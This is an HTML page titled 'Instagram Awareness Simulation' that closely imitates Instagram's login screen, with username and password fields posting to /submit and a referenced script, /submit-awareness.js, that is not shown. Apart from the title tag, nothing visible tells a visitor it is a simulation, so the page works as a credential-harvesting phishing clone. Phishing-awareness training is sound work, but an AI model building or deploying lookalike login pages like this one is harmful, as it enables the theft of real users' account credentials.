<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Instagram Awareness Simulation</title>
  <style>
    * { box-sizing: border-box; }
    body { min-height: 100vh; margin: 0; display: grid; place-items: center; padding: 24px; color: #262626; background: #fafafa; font: 14px Arial, sans-serif; }
    main { width: min(350px, 100%); padding: 40px; border: 1px solid #dbdbdb; border-radius: 2px; background: #fff; text-align: center; }
    h1 { margin: 0 0 28px; font: 700 28px Georgia, serif; }
    form { display: grid; gap: 8px; }
    label { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); }
    input { min-height: 38px; padding: 9px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; }
    button { min-height: 36px; margin-top: 8px; border: 0; border-radius: 8px; color: #fff; background: #0095f6; font-weight: 700; cursor: pointer; }
    input:focus-visible, button:focus-visible { outline: 3px solid #ffb600; outline-offset: 2px; }
  </style>
</head>
<body>
  <main>
    <h1>Instagram</h1>
    <form method="post" action="/submit">
      <label for="username">Username</label>
      <input id="username" name="username" type="text" autocomplete="username" placeholder="Username" required>
      <label for="password">Password</label>
      <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Password" required>
      <button type="submit">Log in</button>
    </form>
  </main>
  <script src="/submit-awareness.js"></script>
</body>
</html>
